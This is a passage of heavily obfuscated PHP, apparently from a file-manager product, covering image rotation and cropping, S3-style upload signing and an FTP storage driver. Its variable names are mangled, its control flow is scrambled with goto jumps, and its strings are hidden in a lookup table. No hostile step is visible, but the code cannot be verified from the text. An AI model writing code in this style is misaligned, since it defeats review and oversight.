$cìÕ»”ßÒô[$eøÜÌÒ–˜†[1857]] == 1) { return $E§‹‹³Ø·; } $féÒåšˆ®ù = 0; if ($cìÕ»”ßÒô[$eøÜÌÒ–˜†[1857]] == 6) { $féÒåšˆ®ù = 90; } goto dÑ’Ë‘Ö¯; dÑ’Ë‘Ö¯: if ($cìÕ»”ßÒô[$eøÜÌÒ–˜†[1857]] == 8) { $féÒåšˆ®ù = 270; } if ($cìÕ»”ßÒô[$eøÜÌÒ–˜†[1857]] == 3) { $féÒåšˆ®ù = 180; } return $this->rotateDegree($E§‹‹³Ø·, $féÒåšˆ®ù); goto d©–ôÅÁŸ‡; d©–ôÅÁŸ‡: } private function rotateDegree($c„òÕØ, $F›‹ˆô ®) { if (!$c„òÕØ || $F›‹ˆô ® % 360 === 0 || !function_exists($_SERVER[í™][1858])) { return $c„òÕØ; } $B©ƒÀ¶ø = imageRotate($c„òÕØ, 360 - $F›‹ˆô ®, 0); imageDestroy($c„òÕØ); return $B©ƒÀ¶ø ? $B©ƒÀ¶ø : $c„òÕØ; } function cut($AíÈÒÃ«½¤, $D±š¼¦Ñ¥Á, $B¦ŠÇ„ªÙ‹) { goto c¯ğ½Ø«ß; AÖ½¡‹Å™’: $fŸİ×•åÏ = $this->creatImage($this->im, $F´àŒ¼®â, $DÈŠ÷Š†ğ³, 0, 0, 0, 0, $this->srcW, $this->srcH); $F¯È­ŸÈâ× = $this->creatImage($fŸİ×•åÏ, $D±š¼¦Ñ¥Á, $B¦ŠÇ„ªÙ‹, 0, 0, ($F´àŒ¼®â - $D±š¼¦Ñ¥Á) / 2, ($DÈŠ÷Š†ğ³ - $B¦ŠÇ„ªÙ‹) / 2, $D±š¼¦Ñ¥Á, $B¦ŠÇ„ªÙ‹); imageDestroy($fŸİ×•åÏ); goto Aï°‡†Ëõ¶; c¯ğ½Ø«ß: $AŠôŠŠ§ÒÇ = $D±š¼¦Ñ¥Á / $B¦ŠÇ„ªÙ‹; $Aš›šÄ„òš = $this->srcW / $this->srcH; if ($AŠôŠŠ§ÒÇ <= $Aš›šÄ„òš) { $DÈŠ÷Š†ğ³ = $B¦ŠÇ„ªÙ‹; $F´àŒ¼®â = $DÈŠ÷Š†ğ³ * ($this->srcW / $this->srcH); } else { $F´àŒ¼®â = $D±š¼¦Ñ¥Á; $DÈŠ÷Š†ğ³ = $F´àŒ¼®â * ($this->srcH / $this->srcW); } goto AÖ½¡‹Å™’; Aï°‡†Ëõ¶: return $this->echoImage($F¯È­ŸÈâ×, $AíÈÒÃ«½¤); goto B¤ö›“•ï; B¤ö›“•ï: } function backFill($dƒ¾¿™™ñª, $DÅİŸ„ÀŞŸ, $A±İ¢¡Øë, $f‘†•ëŠ® = false, $a¤ÏÆâÈ¥å = 255, $cëÅàã×Œ = 255, $f ‹åÙßï’ = 255) { goto b¸ŞËò¦¾Œ; eˆĞ‰…·Ğ: return $this->echoImage($EÉâï²‰İœ, $dƒ¾¿™™ñª); goto Eî’òƒÜÀ¾; b¸ŞËò¦¾Œ: $BÊÉÁŠé†Á = $DÅİŸ„ÀŞŸ / $A±İ¢¡Øë; $EË™ñ•¬ÍÖ = $this->srcW / $this->srcH; if ($BÊÉÁŠé†Á <= $EË™ñ•¬ÍÖ) { $BˆŒšÁ›¨İ = $DÅİŸ„ÀŞŸ; $C©öã¤Ò¸Æ = $BˆŒšÁ›¨İ * ($this->srcH / $this->srcW); } else { $C©öã¤Ò¸Æ = $A±İ¢¡Øë; $BˆŒšÁ›¨İ = $C©öã¤Ò¸Æ * ($this->srcW / $this->srcH); } goto A ›ŞÆŠ®™; Få³ãß—Ãª: if ($f‘†•ëŠ®) { $bóÈ¹ïâ² = imageColorTransparent($EÉâï²‰İœ, $bóÈ¹ïâ²); $d¬±›«İÎ« = $A±İ¢¡Øë - $C©öã¤Ò¸Æ; } imageFilledRectangle($EÉâï²‰İœ, 0, 0, $DÅİŸ„ÀŞŸ, $A±İ¢¡Øë, $bóÈ¹ïâ²); if ($this->srcW > $DÅİŸ„ÀŞŸ || $this->srcH > $A±İ¢¡Øë) { $EÉ×Ÿéö‡ = $this->creatImage($this->im, $BˆŒšÁ›¨İ, $C©öã¤Ò¸Æ, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($BˆŒšÁ›¨İ < $DÅİŸ„ÀŞŸ) { imageCopy($EÉâï²‰İœ, $EÉ×Ÿéö‡, ($DÅİŸ„ÀŞŸ - $BˆŒšÁ›¨İ) / 2, 0, 0, 0, $BˆŒšÁ›¨İ, $C©öã¤Ò¸Æ); } else { if ($C©öã¤Ò¸Æ < $A±İ¢¡Øë) { imageCopy($EÉâï²‰İœ, $EÉ×Ÿéö‡, 0, $d¬±›«İÎ«, 0, 0, $BˆŒšÁ›¨İ, $C©öã¤Ò¸Æ); } else { imageCopy($EÉâï²‰İœ, $EÉ×Ÿéö‡, 0, 0, 0, 0, $BˆŒšÁ›¨İ, $C©öã¤Ò¸Æ); } } } else { imageCopyMerge($EÉâï²‰İœ, $this->im, ($DÅİŸ„ÀŞŸ - $BˆŒšÁ›¨İ) / 2, $d¬±›«İÎ«, 0, 0, $BˆŒšÁ›¨İ, $C©öã¤Ò¸Æ, 100); } goto eˆĞ‰…·Ğ; A ›ŞÆŠ®™: if (function_exists($_SERVER[í™][1859])) { @($EÉâï²‰İœ = imageCreateTrueColor($DÅİŸ„ÀŞŸ, $A±İ¢¡Øë)); if (!$EÉâï²‰İœ) { $EÉâï²‰İœ = imageCreate($DÅİŸ„ÀŞŸ, $A±İ¢¡Øë); } } else { $EÉâï²‰İœ = imageCreate($DÅİŸ„ÀŞŸ, $A±İ¢¡Øë); } $d¬±›«İÎ« = ($A±İ¢¡Øë - $C©öã¤Ò¸Æ) / 2; $bóÈ¹ïâ² = imagecolorallocate($EÉâï²‰İœ, $a¤ÏÆâÈ¥å, $cëÅàã×Œ, $f ‹åÙßï’); goto Få³ãß—Ãª; Eî’òƒÜÀ¾: } function creatImage($D¢º«‘æ, $cÇ¬´©¨À, $dÇ¸‡ÊÃœÅ, $EÍ¼±ø†—Ş, $aÉ©øÆà³Ó, $D‹›Ë¯Óª, $Eù¿œÃ—Ì˜, $béØãğÁõ, $f¦Àïî‰è) { if (function_exists($_SERVER[í™][1859])) { @($Fƒ‰ÌÆäƒØ = ImageCreateTrueColor($cÇ¬´©¨À, $dÇ¸‡ÊÃœÅ)); @imagealphablending($Fƒ‰ÌÆäƒØ, !1); @imagesavealpha($Fƒ‰ÌÆäƒØ, !0); if ($Fƒ‰ÌÆäƒØ) { imageCopyResampled($Fƒ‰ÌÆäƒØ, $D¢º«‘æ, $EÍ¼±ø†—Ş, $aÉ©øÆà³Ó, $D‹›Ë¯Óª, $Eù¿œÃ—Ì˜, $cÇ¬´©¨À, $dÇ¸‡ÊÃœÅ, $béØãğÁõ, $f¦Àïî‰è); } else { $Fƒ‰ÌÆäƒØ = ImageCreate($cÇ¬´©¨À, $dÇ¸‡ÊÃœÅ); imageCopyResized($Fƒ‰ÌÆäƒØ, $D¢º«‘æ, $EÍ¼±ø†—Ş, $aÉ©øÆà³Ó, $D‹›Ë¯Óª, $Eù¿œÃ—Ì˜, $cÇ¬´©¨À, $dÇ¸‡ÊÃœÅ, $béØãğÁõ, $f¦Àïî‰è); } } else { $Fƒ‰ÌÆäƒØ = ImageCreate($cÇ¬´©¨À, $dÇ¸‡ÊÃœÅ); imageCopyResized($Fƒ‰ÌÆäƒØ, $D¢º«‘æ, $EÍ¼±ø†—Ş, $aÉ©øÆà³Ó, $D‹›Ë¯Óª, $Eù¿œÃ—Ì˜, $cÇ¬´©¨À, $dÇ¸‡ÊÃœÅ, $béØãğÁõ, $f¦Àïî‰è); } return $Fƒ‰ÌÆäƒØ; } public function imgRotate($C¦ô¦Ğ÷ğ‘, $EË²ãÂ¸ÌÚ) { goto eôİ¹º¥Áò; AŸŒ‚²–Êå: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $A´†¾ãà = imagegif($BˆÆ±ğ›È, $C¦ô¦Ğ÷ğ‘); break; case IMAGETYPE_JPEG: $A´†¾ãà = imagejpeg($BˆÆ±ğ›È, $C¦ô¦Ğ÷ğ‘, 100); break; case IMAGETYPE_PNG: $A´†¾ãà = imagePNG($BˆÆ±ğ›È, $C¦ô¦Ğ÷ğ‘); break; default: break; } imageDestroy($BˆÆ±ğ›È); imageDestroy($this->im); goto B»œòĞŒî; eôİ¹º¥Áò: if (!$this->im || $EË²ãÂ¸ÌÚ % 360 === 0 || !function_exists($_SERVER[í™][1858])) { return !1; } $BˆÆ±ğ›È = imageRotate($this->im, 360 - $EË²ãÂ¸ÌÚ, 0); $A´†¾ãà = !1; goto AŸŒ‚²–Êå; B»œòĞŒî: return $A´†¾ãà; goto f®º–‚ä‡; f®º–‚ä‡: } function echoImage($cäÙ³æÂºÃ, $a´»±ï˜á») { goto E®Àµ˜ÀÖ; eº…†·°Ñ: $dÕä¹¦™¬ = !1; switch ($this->echoType) { case $D°í÷‹ßÓ[1860]: $dÕä¹¦™¬ = imagePNG($cäÙ³æÂºÃ); break; case $D°í÷‹ßÓ[167]: $dÕä¹¦™¬ = imagePNG($cäÙ³æÂºÃ, $a´»±ï˜á»); break; } imageDestroy($cäÙ³æÂºÃ); goto dîÔõ½÷Ì; E®Àµ˜ÀÖ: $D°í÷‹ßÓ =& $_SERVER[í™]; if (!$cäÙ³æÂºÃ) { return !1; } ob_get_clean(); goto eº…†·°Ñ; dîÔõ½÷Ì: imageDestroy($this->im); return $dÕä¹¦™¬; goto a’…çë¼Ì–; a’…çë¼Ì–: } } if (!function_exists($_SERVER[í™][1861])) { define($_SERVER[í™][1862], 0); define($_SERVER[í™][1863], 1); define($_SERVER[í™][1864], 2); function imageflip($Eì¦ğ¬ÙÚ, $Fß¢¬À³Ñ) { switch ($Fß¢¬À³Ñ) { case IMG_FLIP_HORIZONTAL: $Bµ’ô‚Ü‰ = imagesx($Eì¦ğ¬ÙÚ) - 1; $D´èÊ‰Õ¶Ë = $Bµ’ô‚Ü‰ / 2; $a¬Å×ò³¿Ï = imagesy($Eì¦ğ¬ÙÚ); $eá®ä­ëï = imageistruecolor($Eì¦ğ¬ÙÚ) ? imagecreatetruecolor(1, $a¬Å×ò³¿Ï) : imagecreate(1, $a¬Å×ò³¿Ï); for ($eÃ™œåê¥ = 0; $eÃ™œåê¥ < $D´èÊ‰Õ¶Ë; ++$eÃ™œåê¥) { imagecopy($eá®ä­ëï, $Eì¦ğ¬ÙÚ, 0, 0, $eÃ™œåê¥, 0, 1, $a¬Å×ò³¿Ï); imagecopy($Eì¦ğ¬ÙÚ, $Eì¦ğ¬ÙÚ, $eÃ™œåê¥, 0, $Bµ’ô‚Ü‰ - $eÃ™œåê¥, 0, 1, $a¬Å×ò³¿Ï); imagecopy($Eì¦ğ¬ÙÚ, $eá®ä­ëï, $Bµ’ô‚Ü‰ - $eÃ™œåê¥, 0, 0, 0, 1, $a¬Å×ò³¿Ï); } break; case IMG_FLIP_VERTICAL: $bÍÃíÓ¤ = imagesx($Eì¦ğ¬ÙÚ); $eïÕ¡ê ­À = imagesy($Eì¦ğ¬ÙÚ) - 1; $b‡Œ’Å°°ù = $eïÕ¡ê ­À / 2; $eá®ä­ëï = imageistruecolor($Eì¦ğ¬ÙÚ) ? imagecreatetruecolor($bÍÃíÓ¤, 1) : imagecreate($bÍÃíÓ¤, 1); for ($eÒ‹§ñ”µĞ = 0; $eÒ‹§ñ”µĞ < $b‡Œ’Å°°ù; ++$eÒ‹§ñ”µĞ) { imagecopy($eá®ä­ëï, $Eì¦ğ¬ÙÚ, 0, 0, 0, $eÒ‹§ñ”µĞ, $bÍÃíÓ¤, 1); imagecopy($Eì¦ğ¬ÙÚ, $Eì¦ğ¬ÙÚ, 0, $eÒ‹§ñ”µĞ, 0, $eïÕ¡ê ­À - $eÒ‹§ñ”µĞ, $bÍÃíÓ¤, 1); imagecopy($Eì¦ğ¬ÙÚ, $eá®ä­ëï, 0, $eïÕ¡ê ­À - $eÒ‹§ñ”µĞ, 0, 0, $bÍÃíÓ¤, 1); } break; case IMG_FLIP_BOTH: $bÍÃíÓ¤ = imagesx($Eì¦ğ¬ÙÚ); $a¬Å×ò³¿Ï = imagesy($Eì¦ğ¬ÙÚ); $eá®ä­ëï = imagerotate($Eì¦ğ¬ÙÚ, 180, 0); imagecopy($Eì¦ğ¬ÙÚ, $eá®ä­ëï, 0, 0, 0, 0, $bÍÃíÓ¤, $a¬Å×ò³¿Ï); break; default: return; } imagedestroy($eá®ä­ëï); } } if (!function_exists($_SERVER[í™][1865])) { function imagecreatefrombmp($EŒĞê²Öàä) { return ImageGdBMP::load($EŒĞê²Öàä); } } goto FÜœøâš‡Ú; DÑã®Âˆ’¶: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($b²õÑÑñ´ñ) { parent::__construct($b²õÑÑñ´ñ); $this->signatureVersion($_SERVER[í™][200]); } public function uploadFormData($FÖé–ìÅ±Ú, $F¦©´ÜÍš¡ = 3600) { goto A®²Ü¢’å; DòøÇÃá´: $D¨«â²°«Ô = $AÙœÃÙÛ¬Ó[59]; $B‰ÑÅöÁ‰° = gmdate($AÙœÃÙÛ¬Ó[1121]); $E‰²ÊêèƒÒ = gmdate($AÙœÃÙÛ¬Ó[672]); goto dÆ„ƒ·ã½Ç; Eñšøá»·ï: $D®ˆôæë›µ = array($AÙœÃÙÛ¬Ó[199] => $AÙœÃÙÛ¬Ó[33], $AÙœÃÙÛ¬Ó[1132] => $AÙœÃÙÛ¬Ó[33], $AÙœÃÙÛ¬Ó[1090] => $EÙ´‰î‚Ô , $AÙœÃÙÛ¬Ó[1094] => $fè×Ò“ìÕ”, $AÙœÃÙÛ¬Ó[1098] => $fÏ¶•¥§µ¦, $AÙœÃÙÛ¬Ó[1133] => $c¤©µÕÕ¾, $AÙœÃÙÛ¬Ó[1134] => $FøÌ¾¨®µ, $AÙœÃÙÛ¬Ó[1135] => $B‰ÑÅöÁ‰°, $AÙœÃÙÛ¬Ó[1136] => $C©œøõ¤½Ò, $AÙœÃÙÛ¬Ó[1137] => $E’öÎ£Œ¦ò, $AÙœÃÙÛ¬Ó[169] => $this->getHost()); return $D®ˆôæë›µ; goto a‘ÀÓ‹ËÕ¹; AÃÆ»ø”éŒ: $dñ¾ãÕ³ë³ = hash_hmac($AÙœÃÙÛ¬Ó[1130], $D¨«â²°«Ô, $C§„ƒ¢äª, !0); $dÄ–±Õà = hash_hmac($AÙœÃÙÛ¬Ó[1130], $F¤“©›ƒÌ‰, $dñ¾ãÕ³ë³, !0); $E’öÎ£Œ¦ò = hash_hmac($AÙœÃÙÛ¬Ó[1130], $fÏ¶•¥§µ¦, $dÄ–±Õà); goto Eñšøá»·ï; A®²Ü¢’å: $AÙœÃÙÛ¬Ó =& $_SERVER[í™]; $EÙ´‰î‚Ô  = $AÙœÃÙÛ¬Ó[185]; $FøÌ¾¨®µ = $AÙœÃÙÛ¬Ó[1120]; goto DòøÇÃá´; a¾äá²æ´¾: $Cš¨–ª†Û‘ = array($this->accessKey, $E‰²ÊêèƒÒ, $this->region, $D¨«â²°«Ô, $F¤“©›ƒÌ‰); $c¤©µÕÕ¾ = implode($AÙœÃÙÛ¬Ó[8], $Cš¨–ª†Û‘); $FäŠ„”ÉÎ¹ = array($AÙœÃÙÛ¬Ó[1088] => gmdate($AÙœÃÙÛ¬Ó[1087], strtotime($AÙœÃÙÛ¬Ó[1123])), $AÙœÃÙÛ¬Ó[1089] => array(array($AÙœÃÙÛ¬Ó[1091] => $this->bucket), array($AÙœÃÙÛ¬Ó[1090] => $EÙ´‰î‚Ô ), array($AÙœÃÙÛ¬Ó[1092], $AÙœÃÙÛ¬Ó[1093], $AÙœÃÙÛ¬Ó[33]), array($AÙœÃÙÛ¬Ó[1092], $AÙœÃÙÛ¬Ó[1124], $AÙœÃÙÛ¬Ó[33]), array($AÙœÃÙÛ¬Ó[1092], $AÙœÃÙÛ¬Ó[1125], $AÙœÃÙÛ¬Ó[33]), array($AÙœÃÙÛ¬Ó[1094] => $fè×Ò“ìÕ”), array($AÙœÃÙÛ¬Ó[1126] => $c¤©µÕÕ¾), array($AÙœÃÙÛ¬Ó[1127] => $FøÌ¾¨®µ), array($AÙœÃÙÛ¬Ó[1128] => $B‰ÑÅöÁ‰°), array($AÙœÃÙÛ¬Ó[1129] => $C©œøõ¤½Ò))); goto D³¬Ê”å˜¸; dÆ„ƒ·ã½Ç: $F¤“©›ƒÌ‰ = $AÙœÃÙÛ¬Ó[1122]; $C©œøõ¤½Ò = $F¦©´ÜÍš¡ . $AÙœÃÙÛ¬Ó[33]; $fè×Ò“ìÕ” = $AÙœÃÙÛ¬Ó[1086]; goto a¾äá²æ´¾; D³¬Ê”å˜¸: $fÏ¶•¥§µ¦ = base64_encode(json_encode($FäŠ„”ÉÎ¹)); $E„ÈÄ‰¿É = hash_hmac($AÙœÃÙÛ¬Ó[1130], $E‰²ÊêèƒÒ, $AÙœÃÙÛ¬Ó[1131] . $this->secret, !0); $C§„ƒ¢äª = hash_hmac($AÙœÃÙÛ¬Ó[1130], $this->region, $E„ÈÄ‰¿É, !0); goto AÃÆ»ø”éŒ; a‘ÀÓ‹ËÕ¹: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($bŠ·´®ÎÕã) { parent::__construct(); if (count($bŠ·´®ÎÕã) > 0) { $this->_init($bŠ·´®ÎÕã); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($Fß¨ÚØ Å±) { $B¢³–‚õÓÊ =& $_SERVER[í™]; global $config; $this->appCharset = $config[$B¢³–‚õÓÊ[1138]]; $this->systemCharset = $config[$B¢³–‚õÓÊ[1139]]; if (isset($Fß¨ÚØ Å±[$B¢³–‚õÓÊ[1140]]) && $Fß¨ÚØ Å±[$B¢³–‚õÓÊ[1140]]) { $this->systemCharset = $Fß¨ÚØ Å±[$B¢³–‚õÓÊ[1140]]; } } public function iconvApp($a»—¤¥…æ) { return $this->iconvTo($a»—¤¥…æ, $this->systemCharset, $this->appCharset); } public function iconvSystem($C¶ÊÌ ¤¶) { return $this->iconvTo($C¶ÊÌ ¤¶, $this->appCharset, $this->systemCharset); } public function getPathOuter($D¯ºß¿§Ë—) { goto eìèÔ´–Ë; b§ŒŠÒãèê: $D¯ºß¿§Ë— = KodIO::clear($D¯ºß¿§Ë—); $D¯ºß¿§Ë— = substr($D¯ºß¿§Ë—, strlen($f½å‹ˆµâ)); if (empty($this->pathDriver)) { return $D¯ºß¿§Ë—; } goto bª“Äí‹ßù; eìèÔ´–Ë: $eê‹Ş°…Ú =& $_SERVER[í™]; $f½å‹ˆµâ = $this->iconvApp($this->pathBase); $D¯ºß¿§Ë— = $this->iconvApp($D¯ºß¿§Ë—); goto B„Âù‘È¢–; bª“Äí‹ßù: return $this->pathDriver . $eê‹Ş°…Ú[8] . ltrim($D¯ºß¿§Ë—, $eê‹Ş°…Ú[8]); goto A³Š‹—ˆóï; B„Âù‘È¢–: if (substr($f½å‹ˆµâ, 0, 2) == $eê‹Ş°…Ú[1141]) { $f½å‹ˆµâ = BASIC_PATH . substr($f½å‹ˆµâ, 2); } if (substr($D¯ºß¿§Ë—, 0, 2) == $eê‹Ş°…Ú[1141]) { $D¯ºß¿§Ë— = BASIC_PATH . substr($D¯ºß¿§Ë—, 2); } $f½å‹ˆµâ = KodIO::clear($f½å‹ˆµâ); goto b§ŒŠÒãèê; A³Š‹—ˆóï: } private function _init($f•÷øÛÙ¹â = array()) { $DğáñÓä¢Î =& $_SERVER[í™]; if (!function_exists($DğáñÓä¢Î[1142])) { show_json(LNG($DğáñÓä¢Î[1143]), !1); } $this->config = $f•÷øÛÙ¹â; $this->charsetReset($f•÷øÛÙ¹â); foreach ($f•÷øÛÙ¹â as $bæùßÇì½ö => $f†‰£ÊîŒ¿) { if (isset($this->{$bæùßÇì½ö})) { $this->{$bæùßÇì½ö} = $f†‰£ÊîŒ¿; } } return $this->_login($f•÷øÛÙ¹â); } private function _login($EÍ…¢Èî¿¡) { goto aÉè™ìß¯’; C®ñîïÓºŞ: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $F“÷¿’¸° = $this->pasv == $FŠôµ£²àØ[83] ? !0 : !1; @ftp_pasv($this->connect, $F“÷¿’¸°); goto fƒ†¶ŠÆ²Ï; fƒ†¶ŠÆ²Ï: $aŸ“×ä“°Ï[$E˜š‚¬ğ¨÷] = array($FŠôµ£²àØ[1147] => $this->connect, $FŠôµ£²àØ[169] => $this->host, $FŠôµ£²àØ[168] => $this->scheme, $FŠôµ£²àØ[170] => $this->port); return $a½ˆÔ˜ƒËä; goto føÚÓµ¼È; cŠæ„«‘Ãª: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $a½ˆÔ˜ƒËä = @ftp_login($this->connect, $this->username, $this->userpass); goto C®ñîïÓºŞ; fòŠŠ·ƒÁÆ: if (isset($aŸ“×ä“°Ï[$E˜š‚¬ğ¨÷])) { foreach ($aŸ“×ä“°Ï[$E˜š‚¬ğ¨÷] as $Fšôæ·ƒ›¯ => $Cìí±¥“×ˆ) { $this->{$Fšôæ·ƒ›¯} = $Cìí±¥“×ˆ; } return !0; } $FË¼ô¸ïŸ¿ = parse_url(trim($this->server, $FŠôµ£²àØ[8])); $this->host = $FË¼ô¸ïŸ¿[$FŠôµ£²àØ[169]]; goto D¢Å‡¹ÈÏ; aÉè™ìß¯’: $FŠôµ£²àØ =& $_SERVER[í™]; static $aŸ“×ä“°Ï = array(); $E˜š‚¬ğ¨÷ = md5(json_encode($EÍ…¢Èî¿¡)); goto fòŠŠ·ƒÁÆ; D¢Å‡¹ÈÏ: $Eù›Ã‹ê¿ = isset($FË¼ô¸ïŸ¿[$FŠôµ£²àØ[168]]) && $FË¼ô¸ïŸ¿[$FŠôµ£²àØ[168]] == $FŠôµ£²àØ[1144] ? !0 : !1; $this->scheme = $Eù›Ã‹ê¿ ? $FŠôµ£²àØ[1145] : $FŠôµ£²àØ[1146]; $this->port = isset($FË¼ô¸ïŸ¿[$FŠôµ£²àØ[170]]) ? $FË¼ô¸ïŸ¿[$FŠôµ£²àØ[170]] : 21; goto cŠæ„«‘Ãª; føÚÓµ¼È: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($EÉ ‘Şï®, $DŞ©…ìí²‰ = '', $E²¨°ÖŠïÏ = REPEAT_RENAME) { if ($this->setContent($EÉ ‘Şï®, $DŞ©…ìí²‰)) { return $this->getPathOuter($EÉ ‘Şï®); } return !1; } public function mkdir($bïÛÖ½£¼Í, $E¿É¥¿ëÑé = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $bïÛÖ½£¼Í = $this->iconvSystem($bïÛÖ½£¼Í); if ($this->isFolder($bïÛÖ½£¼Í) || @ftp_mkdir($this->connect, $bïÛÖ½£¼Í)) { return $this->getPathOuter($bïÛÖ½£¼Í); } if (!$this->mkdir($this->pathFather($bïÛÖ½£¼Í))) { return !1; } if ($bïÛÖ½£¼Í = @ftp_mkdir($this->connect, $bïÛÖ½£¼Í)) { return $this->getPathOuter($bïÛÖ½£¼Í); } return !1; } public function copyFile($CœŒ•…¨, $dÔâã¶ƒ) { goto DäÁ“Ù™‰’; DäÁ“Ù™‰’: if (!$this->_isconn()) { return !1; } $CØğÉÓ›ëÖ = $this->pathThis($this->iconvSystem($CœŒ•…¨)); $Eé·”½‹³ = $this->tempFile($CØğÉÓ›ëÖ); goto cä…±ôÙß«; bºÎÈ Á±‰: $this->tempFileRemve($Eé·”½‹³); return $eĞÛ’…êçá; goto eÅÉã«¥Œã; cä…±ôÙß«: $DŒĞÓ”Ş¶ô = $this->iconvApp($Eé·”½‹³); $this->download($CœŒ•…¨, $DŒĞÓ”Ş¶ô); $eĞÛ’…êçá = $this->upload($dÔâã¶ƒ, $DŒĞÓ”Ş¶ô); goto bºÎÈ Á±‰; eÅÉã«¥Œã: } public function moveFile($cÁ´¸Â‰Œ, $dİÑ˜¤ “ä) { if (!$this->_isconn()) { return !1; } $cÁ´¸Â‰Œ = $this->iconvSystem($cÁ´¸Â‰Œ); $dİÑ˜¤ “ä = $this->iconvSystem($dİÑ˜¤ “ä); $A‘ß–‰¶ = @ftp_rename($this->connect, $cÁ´¸Â‰Œ, $dİÑ˜¤ “ä); return $A‘ß–‰¶ ? $this->getPathOuter($dİÑ˜¤ “ä) : !1; } public function delFile($AÀáìëÙã) { if (!$this->_isconn()) { return !1; } $AÀáìëÙã = $this->iconvSystem($AÀáìëÙã); return @ftp_delete($this->connect, $AÀáìëÙã); } public function delFolder($f®ÕŒÀ—¶Œ) { if (!$this->_isconn()) { return !1; } $f®ÕŒÀ—¶Œ = $this->iconvSystem($f®ÕŒÀ—¶Œ); $f‹Á…´È = $this->ftpList($f®ÕŒÀ—¶Œ); if (!$f‹Á…´È) { return @ftp_rmdir($this->connect, $f®ÕŒÀ—¶Œ); } foreach ($f‹Á…´È as $E‹ƒ¡äî„Á) { if ($this->isFolder($E‹ƒ¡äî„Á)) { $E‹ƒ¡äî„Á = $this->iconvApp($E‹ƒ¡äî„Á); $this->delFolder($E‹ƒ¡äî„Á); } else { @ftp_delete($this->connect, $E‹ƒ¡äî„Á); } } return @ftp_rmdir($this->connect, $f®ÕŒÀ—¶Œ); } public function rename($eİÚï•Üğœ, $B‰éìŒí) { goto AĞ¥°›Å‡; C¦ŞÄ¾¨³ß: return $eÕ¶˜ãÍš ? $this->getPathOuter($A´ª¸±¥¦) : !1; goto F®ÓäËÌîÎ; aŸ î‚­„: $fñĞ¤¨ÚŒ = $this->iconvSystem($fñĞ¤¨ÚŒ); $eİÚï•Üğœ = $this->iconvSystem($eİÚï•Üğœ); $B¨ñÑë”µ = $this->pathFather($eİÚï•Üğœ); goto CŒ­‹¬¯ğç; CŒ­‹¬¯ğç: $A´ª¸±¥¦ = rtrim($B¨ñÑë”µ, $Dˆõµß¡ì»[8]) . $Dˆõµß¡ì»[8] . $fñĞ¤¨ÚŒ; $eÕ¶˜ãÍš = @ftp_rename($this->connect, $eİÚï•Üğœ, $A´ª¸±¥¦); $A´ª¸±¥¦ = $this->iconvApp($A´ª¸±¥¦); goto C¦ŞÄ¾¨³ß; AĞ¥°›Å‡: $Dˆõµß¡ì» =& $_SERVER[í™]; if (!$this->_isconn()) { return !1; } $fñĞ¤¨ÚŒ = $this->fileNameAuto($this->pathFather($eİÚï•Üğœ), $B‰éìŒí); goto aŸ î‚­„; F®ÓäËÌîÎ: } private function folderInfo($d¹££—¿’´, $fš‚Á¡Ô¶ğ = false) { goto FÈÜµÄìˆà; cÄ‘‚òîà: $bğî»ÄŸå£ = $this->iconvSystem($d¹££—¿’´); if ($fš‚Á¡Ô¶ğ) { return array($FÅÔìÂÔ“–[28] => $B•ÁØç¯ˆ‚, $FÅÔìÂÔ“–[75] => $f­…Â¬¯°†, $FÅÔìÂÔ“–[29] => $FÅÔìÂÔ“–[76]); } $d¦á¾ìÊÜ¯ = array($FÅÔìÂÔ“–[28] => $B•ÁØç¯ˆ‚, $FÅÔìÂÔ“–[75] => $f­…Â¬¯°†, $FÅÔìÂÔ“–[29] => $FÅÔìÂÔ“–[76], $FÅÔìÂÔ“–[187] => 0, $FÅÔìÂÔ“–[107] => 0, $FÅÔìÂÔ“–[1148] => !0, $FÅÔìÂÔ“–[1149] => !0); goto bñ§âñÆœÇ; bñ§âñÆœÇ: return $d¦á¾ìÊÜ¯; goto CŒ¥³Õ¬œ; FÈÜµÄìˆà: $FÅÔìÂÔ“– =& $_SERVER[í™]; $f­…Â¬¯°† = $this->getPathOuter(rtrim($d¹££—¿’´, $FÅÔìÂÔ“–[8])); $B•ÁØç¯ˆ‚ = $this->pathThis($f­…Â¬¯°†); goto cÄ‘‚òîà; CŒ¥³Õ¬œ: } private function fileInfo($A·À¬´ñ, $dŞô±Şã•¶ = false) { goto E¬“Ì¿·¾ï; aÆá©ÎªÀİ: $eá’®ŠÄêœ = $this->iconvSystem($A·À¬´ñ); if ($dŞô±Şã•¶) { return array($dÓÊŠÊ¾[28] => $Câ´êØ¹œ¿, $dÓÊŠÊ¾[75] => $F’‘–ªìïõ, $dÓÊŠÊ¾[29] => $dÓÊŠÊ¾[167], $dÓÊŠÊ¾[160] => $this->ext($A·À¬´ñ), $dÓÊŠÊ¾[77] => $this->size($A·À¬´ñ)); } $dÏó¥™õ‘ù = array($dÓÊŠÊ¾[28] => $Câ´êØ¹œ¿, $dÓÊŠÊ¾[75] => $F’‘–ªìïõ, $dÓÊŠÊ¾[29] => $dÓÊŠÊ¾[167], $dÓÊŠÊ¾[187] => 0, $dÓÊŠÊ¾[107] => @ftp_mdtm($this->connect, $eá’®ŠÄêœ), $dÓÊŠÊ¾[160] => $this->ext($A·À¬´ñ), $dÓÊŠÊ¾[77] => $this->size($A·À¬´ñ), $dÓÊŠÊ¾[1148] => !0, $dÓÊŠÊ¾[1149] => !0); goto eË†Á»¯à; eË†Á»¯à: $dÏó¥™õ‘ù[$dÓÊŠÊ¾[107]] = $dÏó¥™õ‘ù[$dÓÊŠÊ¾[107]] > 0 ? $dÏó¥™õ‘ù[$dÓÊŠÊ¾[107]] : 0; return $dÏó¥™õ‘ù; goto Aãå‚ä…Ú; E¬“Ì¿·¾ï: $dÓÊŠÊ¾ =& $_SERVER[í™]; $F’‘–ªìïõ = $this->getPathOuter(rtrim($A·À¬´ñ, $dÓÊŠÊ¾[8])); $Câ´êØ¹œ¿ = $this->pathThis($F’‘–ªìïõ); goto 